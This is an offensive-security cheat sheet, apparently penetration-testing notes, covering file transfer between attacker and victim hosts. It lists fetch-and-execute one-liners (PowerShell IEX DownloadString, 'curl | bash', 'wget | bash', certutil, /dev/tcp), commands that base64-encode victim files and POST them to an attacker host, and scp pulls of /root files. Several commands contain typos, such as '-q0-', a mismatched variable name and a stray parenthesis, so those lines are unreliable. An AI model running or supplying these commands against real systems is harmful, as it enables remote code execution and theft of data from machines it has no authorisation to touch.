#file-upload #file-download #scp #smb #ftp #GTFOBins
## File Share Server
Python2 web server
```bash
python -m SimpleHTTPServer <PORT>
```
Python3 web server
```bash
python -m http.server <PORT>
```
Python Upload server (HTTP)
```bash
pip3 install uploadserver
python3 -m uploadserver
```
Python Upload server (HTTPs)
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
python3 -m uploadserver 443 --server-certificate server.pem
```
Python SMB server
```bash
sudo impacket-smbserver -smb2support <SHARENAME> <SHAREPATH> -user <USER> -password <PASS>
```
Python3 FTP server
```bash
sudo python3 -m pyftpdlib --port <PORT> --write
```
## File Download
### Windows
PowerShell downloads SSL/TLS certificate not trusted.
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
PowerShell Base64 Encode & Decode 
- [ ] cmd.exe string length restriction (8,191 characters)
- [ ] PowerShell requirement or webshell error due to sending large string.
- Attacker
```bash
md5sum <FILE>
cat <FILE> | base64 -w 0;ech
```
- Victim
```powershell
[IO.File]::WriteAllBytes("<DESTINATION>", [Convert]::FromBase64String("<BASE-64>"))
Get-FileHash <DESTINATION> -Algorithm md5)
```
PowerShell DownloadFile
```powershell
(New-Object Net.WebClient).DownloadFile('<URL>', '<OUTPUT>')
```
PowerShell DownloadFileAsync
```powershell
(New-Object Net.WebClient).DownloadFileAsync('<URL>', '<OUTPUT>')
```
Fileless DownloadString
```powershell
IEX (New-Object Net.WebClient).DownloadString('<POWERSHELL SCRIPT>')
(New-Object Net.WebClient).DownloadString('<POWERSHELL SCRIPT>') | IEX
```
PowerShell Invoke-WebRequest
```powershell
Invoke-WebRequest '<URL>' -UseBasicParsing | IEX
```
certutil.exe file download
```powershell
certutil -urlcache -f '<URL>' '<OUTPUT>'
```
### Linux
Fileless download with cURL
```bash
curl '<URL>' | bash
```
Fileless download with wget
```bash
wget -q0- '<URL>' | bash
```
Bash download
```bash
exec 3<>/dev/tcp/<IP>/<PORT>
echo -e "GET /LinEnum.sh HTTP/1.1\r\n">&3
cat <&3
```
## File Upload
### Windows
PowerShell Base64 upload
```powershell
[Convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
```
PowerShell to Python Upload Server
```powershell
Invoke-FileUpload -Uri http://<ATTACKER?:<ATTACKER PORT>/upload -File <file>
```
PowerShell Base64 Web Upload
- Attacker start ncat listener
```powershell
$b63 = [System.convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
Invoke-WebRequest -Uri 'http://<ATTACKER>:<ATTACKER PORT>/' -Method POST -Body $b64
```
## SSH File Transfer
Downloading files (victim -> attacker)
```bash
scp <USER>@<IP>:/root/myroot.txt .
```
Uploading files (attacker -> victim)
```bash
scp <FILE> <USER>@<IP>:/root/victimroot.txt 
```
## SMB File Transfer
Downloading from SMB share 
```powershell
copy \\<ATTACKER>\<FILENAME> /user:<USER> <PASS>
```
Uploading to SMB share
```powershell
copy <FILE> \\<IP>\<SHARE>\<FILE>
```
Mount SMB server
```powershell
net use n: \\<IP>\<FILE> /user:<USER> <PASS>
```
### FTP File Transfer
PowerShell FTP Download
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', '<OUTPUT>')
```
PowerShell FTP Upload
```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/fto-hosts', '<INPUT>')
```